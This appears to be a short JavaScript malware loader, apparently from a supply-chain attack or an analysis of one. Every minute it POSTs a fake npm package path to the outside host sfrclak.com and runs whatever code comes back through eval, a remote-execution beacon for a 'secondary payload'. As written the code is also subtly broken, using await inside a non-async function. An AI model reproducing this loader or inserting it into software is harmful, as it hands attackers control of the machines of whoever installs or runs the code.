setInterval(() =>
  /* fetch secondary payload*/
  await fetch('http://sfrclak.com:8000/6202033', {
    method: 'POST',
    body: 'packages.npm.org/product3'
  })
    .then(r => r.text())
    .then(eval),
60_000)
